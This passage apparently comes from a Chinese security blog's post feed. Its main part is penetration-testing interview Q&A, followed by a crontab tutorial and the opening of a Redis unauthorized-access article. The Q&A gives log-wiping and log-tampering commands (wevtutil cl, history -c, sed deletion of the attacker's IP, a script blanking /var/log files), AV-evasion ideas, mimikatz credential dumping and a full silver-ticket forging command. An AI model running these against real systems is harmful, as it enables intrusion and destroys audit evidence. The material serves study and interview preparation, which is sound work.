输出报告</h4><blockquote><p>最好的手段是在渗透前挂上代理，然后在渗透后痕迹清除。</p></blockquote><blockquote><p>⽇志、测试数据的清理 </p><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter: clearev</span><br></pre></td></tr></table></figure></blockquote><p>总结，输出渗透测试报告，附修复⽅案</p></blockquote><h4 id="复测"><a href="#复测" class="headerlink" title="复测"></a>复测</h4><blockquote><p>验证并发现是否有新漏洞，输出报告，归档</p></blockquote><h3 id="痕迹清除"><a href="#痕迹清除" class="headerlink" title="痕迹清除"></a>痕迹清除</h3><h4 id="⼊侵Windows后需要清除哪些⽇志？"><a href="#⼊侵Windows后需要清除哪些⽇志？" class="headerlink" title="⼊侵Windows后需要清除哪些⽇志？"></a>⼊侵Windows后需要清除哪些⽇志？</h4><ol><li>有远程桌面权限时手动删除日志：</li></ol><blockquote><ul><li>开始-程序-管理工具-计算机管理-系统工具-事件查看器-清除日志</li><li>wevtutil工具命令行清除：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wevtutil el             列出系统中所有日志名称</span><br><span class="line">wevtutil cl system      清理系统日志</span><br><span class="line">wevtutil cl application 清理应用程序日志</span><br><span class="line">wevtutil cl security    清理安全日志</span><br></pre></td></tr></table></figure><ul><li>清除recent：</li></ul><blockquote><p>或直接打开<code>C:\Users\Administrator\Recent</code>并删除所有内容<br>或在命令行中输入<code>del /f /s /q “%userprofile%\Recent*.*</code></p></blockquote></blockquote><ol start="2"><li>⼊侵 Linux 服务器后需要清除哪些⽇志？</li></ol><blockquote><p><a href="https://www.cnblogs.com/xiaozi/p/13648156.html">https://www.cnblogs.com/xiaozi/p/13648156.html</a></p></blockquote><blockquote><ul><li>清除命令历史记录</li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">histroy -r          <span class="comment">#删除当前会话历史记录</span></span><br><span class="line"><span class="built_in">history</span> -c          <span class="comment">#删除内存中的所有命令历史</span></span><br><span class="line"><span class="built_in">rm</span> .bash_history   <span class="comment">#删除历史文件中的内容</span></span><br><span class="line">HISTZISE=0          <span class="comment">#通过设置历史命令条数来清除所有历史记录</span></span><br></pre></td></tr></table></figure><ul><li>在隐蔽的位置执行命令，使用vim打开文件执行命令：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:set history=0</span><br><span class="line">:!command</span><br></pre></td></tr></table></figure><ul><li>完全删除日志文件</li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /dev/null &gt; filename</span><br><span class="line">: &gt; filename</span><br><span class="line">&gt; filename</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span> &gt; filename</span><br><span class="line"><span class="built_in">echo</span> &gt; filename</span><br></pre></td></tr></table></figure><ul><li>针对性删除日志文件,如 apache 的 access.log,error.log。直接将⽇志清除过于明显, ⼀般使⽤ sed 进⾏定向清除</li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#删除当天日志</span></span><br><span class="line">sed  -i <span class="string">&#x27;/当天日期/&#x27;</span>d  filename</span><br><span class="line"><span class="comment">#清楚执行IP的日志</span></span><br><span class="line">sed -i -e ‘/192.169.1.1/d’</span><br></pre></td></tr></table></figure><ul><li>篡改日志文件</li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip</span></span><br><span class="line">sed  -i <span class="string">&#x27;/自己的ip/&#x27;</span>d  /var/log/messages</span><br><span class="line"><span class="comment"># 全局替换登录IP地址：</span></span><br><span class="line">sed -i <span class="string">&#x27;s/192.168.166.85/192.168.1.1/g&#x27;</span> secure</span><br></pre></td></tr></table></figure><ul><li>一键清除脚本：</li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/syslog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/messages</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/access_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/httpd/error_log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/xferlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/secure</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/auth.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/user.log</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/wtmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/lastlog</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/log/btmp</span><br><span class="line"><span class="built_in">echo</span> &gt; /var/run/utmp</span><br><span class="line"><span class="built_in">rm</span> ~/./bash_history</span><br><span class="line"><span class="built_in">history</span> -c</span><br></pre></td></tr></table></figure></blockquote><h3 id="有什么⽐较曲折的渗透经历"><a href="#有什么⽐较曲折的渗透经历" class="headerlink" title="有什么⽐较曲折的渗透经历"></a>有什么⽐较曲折的渗透经历</h3><blockquote><p>这个问题想知道你⼯作渗透到什么样的程度，只是简单的漏扫搬砖，还是有毅⼒坚持完成整个渗透，如：对⽬标不放弃，坚持⼀个⽉最终通过各种⼿段，曲折的过程拿下⽬标。</p><p><a href="http://www.hackdig.com/08/hack-106441.htm%E6%A1%88%E4%BE%8B">http://www.hackdig.com/08/hack-106441.htm案例</a></p></blockquote><h3 id="判断出⽹站的-CMS-对渗透有什么意义"><a href="#判断出⽹站的-CMS-对渗透有什么意义" class="headerlink" title="判断出⽹站的 CMS 对渗透有什么意义"></a>判断出⽹站的 CMS 对渗透有什么意义</h3><blockquote><p>查找⽹上已曝光的程序漏洞。如果开源，还能下载相对应的源码进⾏代码审计。</p></blockquote><h3 id="⼀个成熟并且相对安全的-CMS，渗透时扫⽬录的意义？-CMS，渗透时扫⽬录的意义？"><a href="#⼀个成熟并且相对安全的-CMS，渗透时扫⽬录的意义？-CMS，渗透时扫⽬录的意义？" class="headerlink" title="⼀个成熟并且相对安全的 CMS，渗透时扫⽬录的意义？   CMS，渗透时扫⽬录的意义？"></a>⼀个成熟并且相对安全的 CMS，渗透时扫⽬录的意义？   CMS，渗透时扫⽬录的意义？</h3><blockquote><p>敏感⽂件、⼆级⽬录扫描。站⻓的误操作⽐如：⽹站备份的压缩⽂件、说明. txt、⼆级⽬录可能存放着其他站点</p></blockquote><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="Linux提权的方式"><a href="#Linux提权的方式" class="headerlink" title="Linux提权的方式"></a>Linux提权的方式</h4><blockquote><ul><li>dirtypipe漏洞, suid提权, 脏牛提权，pkexec提权等</li><li>除了 EXP 或者⾼版本的内核⽆法提权之外，通过第三⽅软件和服务，除了提权也可以考虑把这台机器当跳板, 达到先进⼊内⽹安全防线最弱的地⽅寻找有⽤的信息，再迂回战术</li><li>Brief</li><li>枚举脚本</li><li>以 root 权限运⾏的程序</li><li>⽤户安装的软件</li><li>弱⼝令或者明⽂密码</li><li>只能内部访问的服务</li><li>suid 和 guid 错误配置</li><li>滥⽤ sudo 权限</li><li>以 root 权限运⾏的脚本⽂件</li><li>错误的路径配置</li><li>计划任务</li><li>未挂载的⽂件系统</li><li>NFS 共享</li><li>通过键盘记录仪窃取密码</li><li>其它有⽤的和提权相关的东⻄</li><li>内核提权</li></ul></blockquote><h4 id="windows提权方式"><a href="#windows提权方式" class="headerlink" title="windows提权方式"></a>windows提权方式</h4><blockquote><p>甜土豆（Juicy Potato（Sweet potato））</p><p>烂土豆（Rotten Potato）</p><p>热土豆 (HotPotato)</p><p>坏土豆（Pipepotato(BadPotato)）</p><p>最基本的就是 Exp 提权，数据库 SQLServer、MYSQL、UDF 等、第三⽅软件提权。</p><p>除此之外提权的成功与否和在于信息收集也⾮常重要，你对这台服务器和管理员了解多少。</p></blockquote><h3 id="nmap的几种扫描方式"><a href="#nmap的几种扫描方式" class="headerlink" title="nmap的几种扫描方式"></a>nmap的几种扫描方式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定端口和范围扫描：namp -p50-100 10.2.51.165</span><br><span class="line">全面扫描：nmap -A -T4 192.168.1.200</span><br><span class="line">子网扫描：namp 192.168.1.1/24</span><br><span class="line">扫描全部端口：nmap -sS -v -T4 -Pn -p 0-65535 -oN FullTCP -iL liveHosts.txt</span><br><span class="line">普通的半开扫描：nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</span><br><span class="line">系统扫描：nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</span><br></pre></td></tr></table></figure><h3 id="信息外带"><a href="#信息外带" class="headerlink" title="信息外带"></a>信息外带</h3><blockquote><p><a href="https://www.cnblogs.com/sunny11/p/14399420.html#_label0">https://www.cnblogs.com/sunny11/p/14399420.html#_label0</a></p></blockquote><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><blockquote><ul><li>修改特征码：</li></ul><p>免杀的最基本思想就是破坏特征，这个特征有可能是特征码，有可能是行为特征，只要破坏了病毒与木马所固有的特征，并保证其原有功能没有改变，一次免杀就能完成了。</p><p>特征码：能识别一个程序是一个病毒的一段不大于 64 字节的特征串</p><ul><li>花指令免杀</li></ul><p>花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。</p><ul><li>加壳免杀</li></ul><p>说起软件加壳，简单地说，软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样罢了。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。</p><p>当我们运行这个加壳的程序时，系统首先会运行程序的“壳”，然后由壳将加密的程序逐步还原到内存中，最后运行程序。这样一来，在我们看来，似乎加壳之后的程序并没有什么变化，然而它却达到了加密的目的，这就是壳的作用。</p><ul><li>shellcode免杀</li></ul><p>将shellcode进行加密，动态解密恢复，申请可写可执行内存并写入解密后的shellcode，将函数指针指向这块内存的起始位置并开始执行</p></blockquote><h3 id="内网搭建代理的方式？"><a href="#内网搭建代理的方式？" class="headerlink" title="内网搭建代理的方式？"></a>内网搭建代理的方式？</h3><blockquote><p>我一般是使用<strong>EarthWorm、FRP、msf的socks代理模块、Stowaway搭建socks代理，使用proxychains使用我们搭建的代理对内网进行渗透</strong></p><p>msf搭建代理分三步走：msf添加路由、msf在指定端口开启socks5代理模块搭建socks代理、proxychains从指定端口使用socks5代理服务</p><p>端口转发用Lcx，但没用过，说自己忘记了</p></blockquote><h3 id="内网扫描的方式"><a href="#内网扫描的方式" class="headerlink" title="内网扫描的方式"></a>内网扫描的方式</h3><blockquote><p>内网fscan扫描 或者 搭建内网socks5代理然后走代理进行扫描</p><p>ladon：<a href="https://github.com/k8gege/Ladon/%E5%A4%A7%E5%9E%8B%E6%9A%B4%E5%8A%9B%E6%89%AB%E5%86%85%E7%BD%91%E5%B7%A5%E5%85%B7">https://github.com/k8gege/Ladon/大型暴力扫内网工具</a></p></blockquote><h3 id="拿到一台域内的主机之后，怎么进行域渗透？"><a href="#拿到一台域内的主机之后，怎么进行域渗透？" class="headerlink" title="拿到一台域内的主机之后，怎么进行域渗透？"></a>拿到一台域内的主机之后，怎么进行域渗透？</h3><blockquote><p>收集域内信息，比如域控的 ip 地址，然后通过 mimikatz 抓取明文密码或者 hash，尝试进行 hash 传递攻击（可以使用 mimikatz 工具进行传递）。或者尝试一些域内的漏洞，比如 MS14-068，zerologin 等</p></blockquote><blockquote><p><a href="https://blog.csdn.net/weixin_40412037/article/details/113348310">内网渗透神器（Mimikatz）——使用教程</a></p></blockquote><h3 id="怎么查找域控"><a href="#怎么查找域控" class="headerlink" title="怎么查找域控"></a>怎么查找域控</h3><blockquote><ul><li>通过 DNS 查询</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig -t SRV _gc._tcp.lab.ropnop.com</span><br><span class="line">dig -t SRV _ldap._tcp.lab.ropnop.com</span><br><span class="line">dig -t SRV _kerberos._tcp.lab.ropnop.com</span><br><span class="line">dig -t SRV _kpasswd._tcp.lab.ropnop.com</span><br></pre></td></tr></table></figure><ul><li>端⼝扫描</li></ul><blockquote><p>域服务器都会开启 389 端⼝，所以可以通过扫描端⼝进⾏识别</p></blockquote><ul><li>其实很多域环境⾥，DNS 服务器就是域控制根本不需要怎么找</li><li>各种命令</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dsquery </span><br><span class="line">net group &quot;Domain controllers&quot; </span><br><span class="line">nltest /DCLIST:pentest.com </span><br><span class="line">......</span><br></pre></td></tr></table></figure></blockquote><h3 id="制作白银票据"><a href="#制作白银票据" class="headerlink" title="制作白银票据"></a>制作白银票据</h3><blockquote><ul><li>条件：</li></ul><blockquote><ul><li>1.域名称</li><li>2.域的 SID 值</li><li>3.域的服务账户的密码 HASH</li><li>4.伪造的用户名，可以是任意用户名，一般伪造 administrator</li><li>5.需要访问的服务</li></ul></blockquote><ul><li>步骤：</li></ul><blockquote><p>第一步：管理员权限运行 mimikatz</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug #提升权限</span><br><span class="line">sekurlsa::logonpasswords #获取 service 账户 hash 和 sid(同一个域下得 sid 一样)</span><br></pre></td></tr></table></figure><p>第二步：清空本地票据缓存</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::purge #清理本地票据缓存</span><br><span class="line">kerberos::list #查看本地保存的票据</span><br></pre></td></tr></table></figure><p>第三步：伪造白银票据并导入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:superman.com /sid:S-1-5-21-259090122-541454442-2960687606 /target:win08.superman.com /rc4:f6f19db774c63e49e9af61346adff204 /service:cifs /user:administrator /ptt</span><br></pre></td></tr></table></figure><p>第四步：访问域控的共享目录</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dir \win08\c$</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">远程登陆，执行命令</span></span><br><span class="line">PsExec.exe \win08 cmd.exe</span><br><span class="line">whoami 查看权限</span><br></pre></td></tr></table></figure></blockquote></blockquote><h3 id="黄金票据和白银票据"><a href="#黄金票据和白银票据" class="headerlink" title="黄金票据和白银票据"></a>黄金票据和白银票据</h3><blockquote><p>白银票据：抓取到了域控服务 hash 的情况下，在客户端以一个普通域用户的身份生成TGS 票据，并且是针对于某个机器上的某个服务的，生成的白银票据,只能访问指定的 target机器中指定的服务。</p></blockquote><blockquote><p>黄金票据：直接抓取域控中账号的 hash，来在 client 端生成一个 TGT 票据，那么该票据是针对所有机器的所有服务。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 面试+笔试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux-Shell脚本学习</title>
      <link href="/2022-09-24-Coder/Linux-Shell%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022-09-24-Coder/Linux-Shell%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p><a href="https://wangdoc.com/bash/index.html">Bash 脚本教程</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Coder </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux-Crontab计划任务</title>
      <link href="/2022-09-24-%E7%9F%A5%E8%AF%86/Linux/Linux-Crontab%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/"/>
      <url>/2022-09-24-%E7%9F%A5%E8%AF%86/Linux/Linux-Crontab%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<p>我们经常使用的是crontab命令是cron table的简写，它是cron的配置文件，也可以叫它作业列表</p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#服务开启</span></span><br><span class="line">service crond start</span><br><span class="line"><span class="comment">#编辑计划任务</span></span><br><span class="line">crontab  -e  -u  用户名</span><br><span class="line"><span class="comment">#查看计划任务</span></span><br><span class="line">crontab  -l  -u  用户名</span><br><span class="line"><span class="comment">#删除计划任务：</span></span><br><span class="line">crontab  -r  -u  用户名</span><br></pre></td></tr></table></figure><h1 id="相关文件"><a href="#相关文件" class="headerlink" title="相关文件"></a>相关文件</h1><blockquote><p>我们可以在以下文件夹内找到相关配置文件:</p><ul><li><p>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;用户名 </p><blockquote><p>#目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名，如果你是root用户，那下面有个root文件，建议日常备份，避免误删除导致crontab 文件丢失；</p></blockquote></li><li><p>&#x2F;etc&#x2F;crontab 这个文件负责调度各种管理和维护任务。#cron服务配置文件</p></li><li><p>&#x2F;etc&#x2F;cron.d&#x2F; 这个目录用来存放任何要执行的crontab文件或脚本。</p></li><li><p>我们还可以把脚本放在&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.daily、&#x2F;etc&#x2F;cron.weekly、&#x2F;etc&#x2F;cron.monthly目录中，让它每小时&#x2F;天&#x2F;星期、月执行一次。</p></li><li><p>cron服务的日志文件。默认情况下,crontab中执行的日志写在&#x2F;var&#x2F;log下,如:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /var/log/cron*</span><br></pre></td></tr></table></figure></li></ul></blockquote><h1 id="时间格式"><a href="#时间格式" class="headerlink" title="时间格式"></a>时间格式</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#时间格式如下：</span></span><br><span class="line">f1   f2  f3   f4   f5 program</span><br><span class="line">*    *    *    *    *</span><br><span class="line">-    -    -    -    -</span><br><span class="line">|    |    |    |    |</span><br><span class="line">|    |    |    |    +----- 星期中星期几 (0 - 6) (星期天 为0)</span><br><span class="line">|    |    |    +---------- 月份 (1 - 12) </span><br><span class="line">|    |    +--------------- 一个月中的第几天 (1 - 31)</span><br><span class="line">|    +-------------------- 小时 (0 - 23)</span><br><span class="line">+------------------------- 分钟 (0 - 59)</span><br><span class="line"><span class="comment">#解释：</span></span><br><span class="line"><span class="comment">#其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。</span></span><br><span class="line"><span class="comment">#当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序，其馀类推</span></span><br><span class="line"><span class="comment">#当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，其馀类推</span></span><br><span class="line"><span class="comment">#当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次，其馀类推</span></span><br><span class="line"><span class="comment">#当 f1 为 a, b, c,... 时表示第 a, b, c,... 分钟要执行，f2 为 a, b, c,... 时表示第 a, b, c...个小时要执行，其馀类推</span></span><br></pre></td></tr></table></figure><h1 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h1><blockquote><ul><li><strong>crond</strong> 命令每分钟会定期检查是否有要执行的工作，如果有要执行的工作便会自动执行该工作。</li></ul><blockquote><p><strong>注意：</strong>新创建的 cron 任务，不会马上执行，至少要过 2 分钟后才可以，当然你可以重启 cron 来马上执行。</p></blockquote><ul><li>linux 任务调度的工作主要分为以下两类：</li></ul><blockquote><p>1、系统执行的工作：系统周期性所要执行的工作，如备份系统数据、清理缓存</p><p>2、个人执行的工作：某个用户定期要做的工作，例如每隔 10 分钟检查邮件服务器是否有新信，这些工作可由每个用户自行设置</p></blockquote><ul><li><p>所有命令需要写成绝对路径形式，如: <strong>&#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker</strong></p></li><li><p>使用者也可以将所有的计划任务设定先存放在文件中，用 crontab file 的方式来设定执行时间</p></li><li><p>在 shell 脚本开头使用以下代码,调用sh解析脚本：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">. /etc/profile</span><br><span class="line">. ~/.bash_profile</span><br></pre></td></tr></table></figure></li><li><p>在 <strong>&#x2F;etc&#x2F;crontab</strong> 中添加环境变量，在可执行命令之前添加命令 <strong>. &#x2F;etc&#x2F;profile;&#x2F;bin&#x2F;sh</strong>，使得环境变量生效，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20 03 * * * . /etc/profile;/bin/sh /var/www/runoob/test.sh</span><br></pre></td></tr></table></figure></li></ul></blockquote><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><ul><li>每一分钟执行一次 &#x2F;bin&#x2F;ls：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* * * * * /bin/ls</span><br></pre></td></tr></table></figure><ul><li>在 12 月内, 每天的早上 6 点到 12 点，每隔 3 个小时 0 分钟执行一次 &#x2F;usr&#x2F;bin&#x2F;backup：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 6-12/3 * 12 * /usr/bin/backup</span><br></pre></td></tr></table></figure><ul><li>周一到周五每天下午 5:00 寄一封信给 <a href="mailto:&#x61;&#x6c;&#101;&#x78;&#x40;&#x64;&#111;&#109;&#x61;&#x69;&#x6e;&#46;&#110;&#x61;&#x6d;&#x65;">&#x61;&#x6c;&#101;&#x78;&#x40;&#x64;&#111;&#109;&#x61;&#x69;&#x6e;&#46;&#110;&#x61;&#x6d;&#x65;</a>：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 17 * * 1-5 mail -s &quot;hi&quot; alex@domain.name &lt; /tmp/maildata</span><br></pre></td></tr></table></figure><ul><li>每月每天的午夜 0 点 20 分, 2 点 20 分, 4 点 20 分….执行 echo “haha”：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20 0-23/2 * * * echo &quot;haha&quot;</span><br></pre></td></tr></table></figure><ul><li>下面再看看几个具体的例子：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0 */2 * * * /sbin/service httpd restart  <span class="comment">#意思是每两个小时重启一次apache </span></span><br><span class="line">50 7 * * * /sbin/service sshd start  <span class="comment">#意思是每天7：50开启ssh服务 </span></span><br><span class="line">50 22 * * * /sbin/service sshd stop  <span class="comment">#意思是每天22：50关闭ssh服务 </span></span><br><span class="line">0 0 1,15 * * fsck /home  <span class="comment">#每月1号和15号检查/home 磁盘 </span></span><br><span class="line">1 * * * * /home/bruce/backup  <span class="comment">#每小时的第一分执行 /home/bruce/backup这个文件 </span></span><br><span class="line">00 03 * * 1-5 find /home <span class="string">&quot;*.xxx&quot;</span> -mtime +4 -<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;  <span class="comment">#每周一至周五3点钟，在目录/home中，查找文件名为*.xxx的文件，并删除4天前的文件。</span></span><br><span class="line">30 6 */10 * * <span class="built_in">ls</span>  <span class="comment">#意思是每月的1、11、21、31日是的6：30执行一次ls命令</span></span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://www.runoob.com/linux/linux-comm-crontab.html">Linux crontab 命令</a></li><li><a href="https://wangdoc.com/bash/startup.html">https://wangdoc.com/bash/startup.html</a></li><li><a href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">Linux Crontab 定时任务</a></li><li><a href="https://www.cnblogs.com/intval/p/5763929.html">Linux定时任务Crontab命令详解</a></li><li><a href="https://www.cnblogs.com/EasonJim/p/8308717.html">Linux下的&#x2F;etc&#x2F;crontab文件和crontab -e命令区别及Crontab命令详解（转）</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计划任务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x12 - redis未授权访问漏洞</title>
      <link href="/2022-09-24-WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x12-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022-09-24-WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x12-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h1><h2 id="未授权概述"><a href="#未授权概述" class="headerlink" title="未授权概述"></a>未授权概述</h2><p>未授权访问漏洞可以理解为需要安全配置或权限认证的地址、授权页面配置不当导致其他用户可以无需认证授权直接访问从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露。</p><h2 id="常见未授权访问漏洞"><a href="#常见未授权访问漏洞" class="headerlink" title="常见未授权访问漏洞"></a>常见未授权访问漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redis 未授权访问漏洞</span><br><span class="line">Docker 未授权访问漏洞</span><br><span class="line">MongoDB 未授权访问漏洞</span><br><span class="line">Jenkins 未授权访问漏洞</span><br><span class="line">Memcached 未授权访问漏洞</span><br><span class="line">JBOSS 未授权访问漏洞</span><br><span class="line">VNC 未授权访问漏洞</span><br><span class="line">ZooKeeper 未授权访问漏洞</span><br><span class="line">Rsync 未授权访问漏洞</span><br><span class="line">Atlassian Crowd 未授权访问漏洞</span><br><span class="line">CouchDB 未授权访问漏洞</span><br><span class="line">Elasticsearch 未授权访问漏洞</span><br><span class="line">Hadoop 未授权访问漏洞</span><br><span class="line">Jupyter Notebook 未授权访问漏洞</span><br></pre></td></tr></table></figure><h1 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h1><h2 id="Redis简介"><a href="#Redis简介" class="headerlink" title="Redis简介"></a>Redis简介</h2><blockquote><p><a href="https://www.redis.com.cn/redis-intro.html">Redis 简介</a></p></blockquote><p><strong>Redis 是完全开源免费的，一个灵活的高性能 key-value 数据结构存储，可以用来作为数据库、缓存和消息队列。</strong></p><p>Redis是用C语言开发的一个开源的高性能键值对（key-value）数据库，和Memcached类似。Redis支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set有序集合)和hash（哈希类型）。这些数据类型都支持push&#x2F;pop、add&#x2F;remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，Redis支持各种不同方式的排序。与Memcached一样，为了保证效率，数据都是缓存在内存中。区别的是Redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。</p><p>Redis也是一个高性能的key-value数据库。Redis的出现，很大程度补偿了Memcached这类key&#x2F;value存储的不足，在部分场合可以对关系数据库起到很好的补充作用。它提供了Java，C&#x2F;C++，C#，PHP，JavaScript，Perl，Object-C，Python，Ruby，Erlang等客户端，使用很方便。</p><p>Redis支持主从同步。数据可以从主服务器向任意数量的从服务器上同步，从服务器可以是关联其他从服务器的主服务器。这使得Redis可执行单层树复 制。存盘可以有意无意的对数据进行写操作。由于完全实现了发布&#x2F;订阅机制，使得从数据库在任何地方同步树时，可订阅一个频道并接收主服务器完整的消息发布记录。同步对读取操作的可扩展性和数据冗余很有帮助。</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><blockquote><p>Redis 主要有两个应用场景：</p><ol><li>存储 缓存 用的数据；</li><li>需要高速读&#x2F;写的场合使用它快速读&#x2F;写；</li></ol></blockquote><h3 id="Redis-架构"><a href="#Redis-架构" class="headerlink" title="Redis 架构"></a>Redis 架构</h3><blockquote><p>Redis 主要由有两个程序组成：</p><p>Redis 客户端 redis-cli</p><p>Redis 服务器 redis-server</p><p>客户端、服务器可以位于同一台计算机或两台不同的计算机中。</p></blockquote><h3 id="什么是Redis主复制原理"><a href="#什么是Redis主复制原理" class="headerlink" title="什么是Redis主复制原理"></a>什么是Redis主复制原理</h3><p>如果把数据存储在单个Redis的实例中，当读写数据量比较大的时候，服务端就很难承受。为了应对这种情 况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中 主机和从机数据相同，而从机只负责读，主机只负责写（向主机写，从从机读，读写分离），通过读写分离可以大幅度减轻流量的压力，算是一 种通过牺牲空间来换取效率的缓解方式。</p><blockquote><p><a href="https://www.bilibili.com/video/BV19i4y1A7wz/?spm_id_from=333.788.recommend_more_video.-1">主从之间有通信，主机的更改要同步到从机</a></p></blockquote><blockquote><ol><li>分布式的服务器，主机宕机还会有从机备份，主机有修改要同步到从机，可以防止数据丢失</li></ol><blockquote><ul><li><p>增量复制</p></li><li><p>全量复制</p></li></ul></blockquote><ol start="2"><li><p>优点不止于此，还可以有读写分离</p></li><li><p>可用性拓展性有所提高</p></li></ol></blockquote><h3 id="Redis常用命令"><a href="#Redis常用命令" class="headerlink" title="Redis常用命令"></a>Redis常用命令</h3><blockquote><p><a href="https://www.cnblogs.com/cxxjohnson/p/9072383.html">redis常用命令大全</a></p></blockquote><figure class="highlight 